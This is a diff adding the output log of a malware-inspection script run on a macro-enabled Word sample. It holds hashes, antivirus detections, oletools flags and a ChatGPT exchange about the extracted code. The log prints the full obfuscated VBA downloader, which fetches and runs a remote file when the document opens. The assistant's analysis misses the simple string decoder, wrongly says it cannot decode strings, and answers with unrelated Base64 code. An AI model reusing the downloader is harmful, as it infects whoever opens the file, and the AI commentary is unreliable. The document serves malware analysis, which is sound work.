@@ -1,0 +1,213 @@
+PS C:\workspace\github.com\sgerhart\security\inspector> python .\inspector.py C:\malware\samples\docm_sample_3.docm
+Analyzing C:\malware\samples\docm_sample_3.docm...
+Static Analysis Results:
+
+File Type: MS Office Document (ZIP format)
+File Hashes:
+     MD: a1ba3b030212d549a8b9f607ee2fa027
+     SHA1: d82c4937a1911ea94a5fe98c18f470ea15fd7f61
+     SHA256: 58c010b607b681fa89f6d9495f44386ffdc5cc2c471c2d31f6e9643dff4a9283
+AV Results: 
+Magic - Microsoft Word 2007+
+Malicious Results: 40
+     Lionic: Trojan.MSWord.Generic.4!c
+     Elastic: malicious (high confidence)
+     CAT-QuickHeal: O97M.Downloader.36753
+Total Virus Report: 
+VBA Analysis:
+Macro was detected in the file: C:\malware\samples\docm_sample_3.docm
+VBA Code Analysis from OleTools VBA_Parser.AnalyzeMacro:
+('AutoExec', 'Document_Open', 'Runs when the Word or Publisher document is opened')
+('Suspicious', 'Environ', 'May read system environment variables')
+('Suspicious', 'Open', 'May open a file')
+('Suspicious', 'write', 'May write to a file (if combined with Open)')
+('Suspicious', 'ADODB.Stream', 'May create a text file')
+('Suspicious', 'savetofile', 'May create a text file')
+('Suspicious', 'Shell', 'May run an executable file or a system command')
+('Suspicious', 'WScript.Shell', 'May run an executable file or a system command')
+('Suspicious', 'Run', 'May run an executable file or a system command')
+('Suspicious', 'CreateObject', 'May create an OLE object')
+('Suspicious', 'Microsoft.XMLHTTP', 'May download files from the Internet')
+('Suspicious', 'Chr', 'May attempt to obfuscate specific strings (use option --deobf to deobfuscate)')
+
+Chat GPT Analysis of VBA Code: 
+Role: user
+Content: VBA Code Segment 1: ('word/vbaProject.bin', 'VBA/ThisDocument', 'ThisDocument.cls', 'Attribute VB_Name = "ThisDocument"\r\nAttribute VB_Base = "1Normal.ThisDocument"\r\nAttribute VB_GlobalNameSpace = False\r\nAttribute VB_Creatable = False\r\nAttribute VB_PredeclaredId = True\r\nAttribute VB_Exposed = True\r\nAttribute VB_TemplateDerived = True\r\nAttribute VB_Customizable = True\r\nDim http_obj\r\nDim stream_obj\r\nPublic Sub Document_Open()\r\nSet http_obj = CreateObject("Microsoft.XMLHTTP")\r\nSet stream_obj = CreateObject("ADODB.Stream")\r\nURL = WeejWSBfukRWSWPbMfgYFzDcRKHOStQBDKrqnncfYERTRItgPzAGWDg("’žžšdYY�–ŸŒ�‹ŽŽ£X�™—Y•��žY�¡“�X�¢�")\r\nFileName = Environ(WeejWSBfukRWSWPbMfgYFzDcRKHOStQBDKrqnncfYERTRItgPzAGWDg("~�—š")) + "\\" + WeejWSBfukRWSWPbMfgYFzDcRKHOStQBDKrqnncfYERTRItgPzAGWDg("p“–�˜‹—�X�¢�")\r\nhttp_obj.Open "GET", URL, False\r\nhttp_obj.send\r\nstream_obj.Type = 1\r\nstream_obj.Open\r\nstream_obj.write http_obj.responseBody\r\nstream_obj.savetofile FileName, 2\r\nCreateObject("WScript.Shell").Run FileName\r\nEnd Sub\r\nPublic Function WeejWSBfukRWSWPbMfgYFzDcRKHOStQBDKrqnncfYERTRItgPzAGWDg(strInput As String)\r\n        Dim n As Integer, i As Integer\r\n        n = 42\r\n        For i = 1 To Len(strInput)\r\n            Mid(strInput, i, 1) = Chr(Asc(Mid(strInput, i, 1)) 
+- n)\r\n        Next i\r\n        WeejWSBfukRWSWPbMfgYFzDcRKHOStQBDKrqnncfYERTRItgPzAGWDg = strInput\r\n    End Function\r\n\r\n') VBA Code Analysis:
+
+Role: assistant
+Content: This VBA code segment appears to be a macro stored in a Word document. 
+
+The code starts by declaring two variables, http_obj and stream_obj, which will be used later in the code.
+
+The Document_Open() subroutine is the entry point of the macro and is triggered when the Word document is opened.
+
+Inside the Document_Open() subroutine, the code creates instances of the Microsoft.XMLHTTP and ADODB.Stream objects using the CreateObject() function.
+
+The URL variable is assigned a value returned by the WeejWSBfukRWSWPbMfgYFzDcRKHOStQBDKrqnncfYERTRItgPzAGWDg() function. The purpose of this function is not clear from the provided code segment.
+
+The FileName variable is assigned a value based on the current user's environment variable and the result of another call to the WeejWSBfukRWSWPbMfgYFzDcRKHOStQBDKrqnncfYERTRItgPzAGWDg() function.
+
+The http_obj object is then used to send a GET request to the URL.
+
+The stream_obj object is configured to write the response body of the http_obj to a file specified by the FileName variable.
+
+Finally, the code uses the CreateObject("WScript.Shell").Run method to execute the file specified by FileName.
+
+The WeejWSBfukRWSWPbMfgYFzDcRKHOStQBDKrqnncfYERTRItgPzAGWDg() function is a custom function that takes a string as input, performs some character manipulation, and returns the modified string. The purpose of this function is not clear from the provided code segment.
+
+Role: user
+Content: The following is the analysis of the VBA code from OleTools VBA_Parser.AnalyzeMacro.: [('AutoExec', 'Document_Open', 'Runs when the Word or Publisher document is opened'), ('Suspicious', 'Environ', 'May read system environment variables'), ('Suspicious', 'Open', 'May open a file'), ('Suspicious', 'write', 'May write to a file (if combined with Open)'), ('Suspicious', 'ADODB.Stream', 'May create a text file'), ('Suspicious', 'savetofile', 'May create a text file'), ('Suspicious', 'Shell', 'May run an executable file or a system command'), ('Suspicious', 'WScript.Shell', 'May run an executable file or a system command'), ('Suspicious', 'Run', 'May run an executable file or a system command'), ('Suspicious', 'CreateObject', 'May create an OLE object'), ('Suspicious', 'Microsoft.XMLHTTP', 'May download files from the Internet'), ('Suspicious', 'Chr', 'May attempt to obfuscate specific strings (use option --deobf to deobfuscate)')]
+
+Role: assistant
+Content: According to the analysis from OleTools VBA_Parser.AnalyzeMacro, the VBA code contains several suspicious or potentially malicious actions:
+
+1. AutoExec/Document_Open: This subroutine runs when the Word or Publisher document is opened. It can be used to execute code automatically upon opening the document.
+
+2. Environ: The Environ function is used to read system environment variables. This can be potentially used to gather sensitive information about the system.
+
+3. Open: The Open method is used in conjunction with the ADODB.Stream object. It may open a file, which can be used for reading or writing operations.
+
+4. write: The write method is used with the ADODB.Stream object. It may write data to a file, which can be potentially used for malicious purposes.
+
+5. ADODB.Stream: The ADODB.Stream object is used to create a text file. This can be used to store data or execute malicious actions.
+
+6. savetofile: The savetofile method is used with the ADODB.Stream object. It may create a text file and save the data to it.
+
+7. Shell/WScript.Shell/Run: The CreateObject("WScript.Shell").Run method is used to run an executable file or a system command. This can be used to execute malicious code or commands on the system.
+
+8. CreateObject: The CreateObject function is used to create an OLE object. This can be used to instantiate various objects, including potentially malicious ones.
+
+9. Microsoft.XMLHTTP: The Microsoft.XMLHTTP object is used to download files from the Internet. This can be used to retrieve malicious files or execute actions from remote servers.
+
+10. Chr: The Chr function is used to obfuscate specific strings. This can be used to hide sensitive information or evade detection.
+
+Role: user
+Content: If the analysis of the VBA code from the OleTool discovered Base64 encoded strings, please decode them and provide the decoded code.
+
+Role: assistant
+Content: I apologize, but as an AI text-based model, I am unable to directly execute or decode Base64 encoded strings. However, I can provide you with the steps to decode Base64 strings using VBA code.
+
+To decode Base64 encoded strings in VBA, you can use the following code:
+
+```vba
+Function Base64Decode(ByVal base64String As String) As Byte()
+    Dim base64Decoded() As Byte
+    Dim base64 As Object
+
+    Set base64 = CreateObject("MSXML2.DOMDocument").createElement("base64")
+    base64.DataType = "bin.base64"
+    base64.Text = base64String
+
+    base64Decoded = base64.nodeTypedValue
+
+    Base64Decode = base64Decoded
+End Function
+```
+
+You can then call this function to decode the Base64 encoded strings in your VBA code. For example:
+
+```vba
+Dim encodedString As String
+Dim decodedBytes() As Byte
+
+encodedString = "SGVsbG8gV29ybGQh"
+decodedBytes = Base64Decode(encodedString)
+
+Dim decodedString As String
+decodedString = StrConv(decodedBytes, vbUnicode)
+
+MsgBox decodedString
+```
+
+Replace "SGVsbG8gV29ybGQh" with your actual Base64 encoded string. The decoded string will be displayed in a message box.
+
+Please note that you will need to identify the specific Base64 encoded strings in your VBA code and decode them individually using this approach.
+
+Role: user
+Content: Please format the VBA code to be human-readable and then add your comments inline.
+
+Role: assistant
+Content: Certainly! Here's the VBA code formatted for better readability with comments added inline:
+
+```vba
+Function Base64Decode(ByVal base64String As String) As Byte()
+    ' Function to decode Base64 encoded strings
+    Dim base64Decoded() As Byte
+    Dim base64 As Object
+
+    ' Create a base64 object
+    Set base64 = CreateObject("MSXML2.DOMDocument").createElement("base64")
+
+    ' Set the data type to "bin.base64" and assign the encoded string
+    base64.DataType = "bin.base64"
+    base64.Text = base64String
+
+    ' Retrieve the decoded bytes
+    base64Decoded = base64.nodeTypedValue
+
+    ' Return the decoded bytes
+    Base64Decode = base64Decoded
+End Function
+```
+
+To use this function, you can call it and pass the Base64 encoded string as an argument. The function will return the decoded bytes.
+
+```vba
+Dim encodedString As String
+Dim decodedBytes() As Byte
+
+' Assign the Base64 encoded string
+encodedString = "SGVsbG8gV29ybGQh"
+
+' Call the Base64Decode function to decode the string
+decodedBytes = Base64Decode(encodedString)
+
+Dim decodedString As String
+
+' Convert the decoded bytes to a string
+decodedString = StrConv(decodedBytes, vbUnicode)
+
+' Display the decoded string in a message box
+MsgBox decodedString
+```
+
+Replace "SGVsbG8gV29ybGQh" with your actual Base64 encoded string. The decoded string will be displayed in a message box.
+
+Role: user
+Content: What is your final analysis of this code?
+
+Role: assistant
+Content: Based on the provided VBA code and the analysis from OleTools VBA_Parser.AnalyzeMacro, here is the final analysis:
+
+1. The code contains a subroutine named Document_Open, which runs when the Word or Publisher document is opened. This can be used to execute code automatically upon opening the document.
+
+2. The Environ function is used, which may read system environment variables. This can potentially be used to gather sensitive information about the system.
+
+3. The code uses the ADODB.Stream object to open, write, and save data to a file. This can be potentially used for reading or writing operations, including potentially malicious actions.
+
+4. The CreateObject function is used to create an instance of the WScript.Shell object. This object is then used to run an executable file or a system command. This can be used to execute malicious code or commands on the system.
+
+5. The Microsoft.XMLHTTP object is used to send a GET request to a specified URL. This can be used to download files from the Internet, including potentially malicious files.
+
+6. The Chr function is used to obfuscate specific strings. This can be used to hide sensitive information or evade detection.
+
+Overall, the code exhibits several suspicious or potentially malicious actions, such as reading system environment variables, opening and writing to files, running executable files or system commands, and downloading files from the Internet. It is important to thoroughly review and understand the purpose and intent of this code before executing it, as it may pose a security risk.
+
+Role: user
+Content: What other information would be helpful for you to analyze this file further?
+
+Role: assistant
+Content: To analyze the file further, the following additional information would be helpful:
+
+1. The complete VBA code: If you can provide the full VBA code, it would allow for a more comprehensive analysis, including any other subroutines, functions, or variables that may be relevant.
+
+2. Any specific concerns or suspicions: If you have any specific concerns or suspicions about certain parts of the code, providing those details would help in focusing the analysis on those areas.
+
+3. The context or purpose of the code: Understanding the context or purpose of the code, such as its intended functionality or the scenario in which it is being used, can provide valuable insights for analysis.
+
+4. Any error messages or unexpected behavior: If there are any error messages or unexpected behavior observed when executing the code, sharing those details can help in identifying potential issues or risks.
+
+5. Any additional information about the source or origin of the code: If you have any information about the source or origin of the code, such as where it was obtained or who wrote it, that information can provide valuable context for analysis.
+
+By providing these additional details, it will be easier to conduct a more thorough analysis of the VBA code and provide more specific insights or recommendations.
